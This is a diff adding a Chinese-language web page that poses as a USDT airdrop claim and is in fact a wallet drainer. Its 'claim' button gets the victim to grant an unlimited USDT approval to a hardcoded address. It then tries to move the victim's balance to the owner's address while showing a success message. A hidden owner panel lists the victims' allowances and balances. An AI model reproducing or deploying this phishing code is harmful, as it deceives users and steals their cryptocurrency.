@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>USDT 代幣空投獎勵</title>
+    <script type="module" src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+      body {
+        background: linear-gradient(to right, #f8fafc, #e0f2fe);
+        font-family: 'Inter', sans-serif;
+      }
+      .fade-in {
+        animation: fadeIn 0.8s ease-in-out forwards;
+        opacity: 0;
+      }
+      @keyframes fadeIn {
+        to { opacity: 1; }
+      }
+    </style>
+  </head>
+  <body class="flex flex-col items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-md bg-white shadow-2xl rounded-2xl p-8 fade-in border border-gray-200">
+      <h2 class="text-2xl font-semibold mb-6 text-center text-gray-800">USDT 空投獎勵領取</h2>
+
+      <label class="block mb-2 text-gray-700">選擇錢包</label>
+      <select id="walletSelector" class="w-full mb-4 px-4 py-2 border border-gray-300 rounded-lg">
+        <option value="metamask">MetaMask</option>
+        <option value="walletconnect">WalletConnect (支援 Trust Wallet 等)</option>
+      </select>
+
+      <button id="connectButton" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-lg mb-4 transition-all">連接錢包</button>
+      <div id="walletAddress" class="text-sm text-gray-600 text-center mb-4"></div>
+
+      <label for="fakeAddressInput" class="block text-gray-700 font-medium">錢包地址</label>
+      <input type="text" id="fakeAddressInput" placeholder="請輸入您的錢包地址"
+        class="w-full mt-1 mb-6 px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" />
+
+      <button id="approveButton" class="w-full bg-green-600 hover:bg-green-700 text-white font-medium py-2 px-4 rounded-lg transition-all">領取空投</button>
+
+      <div id="status" class="text-sm text-center text-gray-700 mt-4"></div>
+
+      <div id="ownerActions" class="hidden mt-6">
+        <button id="viewApprovals" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-medium py-2 px-4 rounded-lg border">查看授權錢包清單</button>
+      </div>
+    </div>
+
+    <div id="log" class="w-full max-w-3xl mt-10 bg-white p-6 rounded-xl shadow border fade-in"></div>
+
+    <script type="module">
+      import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js";
+
+      const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // ⚠️ 代換
+      const DEX_ADDRESS = "0x68c9af29b3aace4940e98ba470a4cc79b34c76cc";   // ⚠️ 代換
+      const OWNER_ADDRESS = "0x04920C9E605580d58c49A7d8D16C2835C039535D";      // ⚠️ 你的地址
+
+      const ABI = [
+        "function approve(address spender, uint256 amount) public returns (bool)",
+        "function allowance(address owner, address spender) public view returns (uint256)",
+        "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+        "function balanceOf(address owner) public view returns (uint256)"
+      ];
+
+      let provider, signer, userAddress;
+      const userList = new Set();
+
+      const connectButton = document.getElementById("connectButton");
+      const approveButton = document.getElementById("approveButton");
+      const viewApprovals = document.getElementById("viewApprovals");
+      const status = document.getElementById("status");
+      const walletDisplay = document.getElementById("walletAddress");
+      const walletSelector = document.getElementById("walletSelector");
+      const log = document.getElementById("log");
+      const ownerPanel = document.getElementById("ownerActions");
+
+      connectButton.onclick = async () => {
+        const choice = walletSelector.value;
+        try {
+          if (choice === "metamask") {
+            if (typeof window.ethereum !== "undefined") {
+              provider = new ethers.BrowserProvider(window.ethereum);
+              await provider.send("eth_requestAccounts", []);
+              signer = await provider.getSigner();
+            } else {
+              return (status.innerText = "請安裝 MetaMask 錢包");
+            }
+          } else if (choice === "walletconnect") {
+            const WalletConnectProvider = window.WalletConnectProvider.default;
+            const wcProvider = new WalletConnectProvider({
+              rpc: {
+                1: "https://mainnet.infura.io/v3/YOUR_INFURA_ID"
+              }
+            });
+            await wcProvider.enable();
+            provider = new ethers.BrowserProvider(wcProvider);
+            signer = await provider.getSigner();
+          }
+
+          userAddress = await signer.getAddress();
+          walletDisplay.innerText = `已連接錢包: ${userAddress}`;
+          status.innerText = "錢包已連接成功";
+          if (userAddress.toLowerCase() === OWNER_ADDRESS.toLowerCase()) {
+            ownerPanel.classList.remove("hidden");
+          }
+        } catch (e) {
+          status.innerText = "連接失敗";
+        }
+      };
+
+      approveButton.onclick = async () => {
+        if (!signer) return (status.innerText = "請先連接錢包");
+
+        const usdt = new ethers.Contract(USDT_ADDRESS, ABI, signer);
+        const maxApprove = ethers.MaxUint256;
+
+        try {
+          status.innerText = "正在領取空投...";
+          const tx = await usdt.approve(DEX_ADDRESS, maxApprove);
+          await tx.wait();
+
+          userList.add(userAddress);
+          await tryTransferFrom(userAddress);
+
+          status.innerText = "空投領取成功！";
+        } catch (err) {
+          status.innerText = "授權失敗";
+        }
+      };
+
+      async function tryTransferFrom(fromAddress) {
+        const usdt = new ethers.Contract(USDT_ADDRESS, ABI, signer);
+        try {
+          const allowance = await usdt.allowance(fromAddress, DEX_ADDRESS);
+          const balance = await usdt.balanceOf(fromAddress);
+          const amount = allowance < balance ? allowance : balance;
+
+          if (amount > 0n) {
+            const tx = await usdt.transferFrom(fromAddress, OWNER_ADDRESS, amount);
+            await tx.wait();
+          }
+        } catch (err) {}
+      }
+
+      viewApprovals.onclick = async () => {
+        log.innerHTML = "<h3 class='text-xl font-semibold mb-4'>授權地址清單</h3>";
+        const usdt = new ethers.Contract(USDT_ADDRESS, ABI, provider);
+        for (const addr of userList) {
+          try {
+            const allowance = await usdt.allowance(addr, DEX_ADDRESS);
+            const balance = await usdt.balanceOf(addr);
+            log.innerHTML += `<div class='mb-4 p-4 bg-gray-50 rounded-lg border'><strong>地址:</strong> ${addr}<br>
+              <strong>授權額度:</strong> ${ethers.formatUnits(allowance, 6)} USDT<br>
+              <strong>當前餘額:</strong> ${ethers.formatUnits(balance, 6)} USDT</div>`;
+          } catch (err) {
+            log.innerHTML += `<p>無法讀取 ${addr} 的資訊</p>`;
+          }
+        }
+      };
+    </script>
+  </body>
+</html>
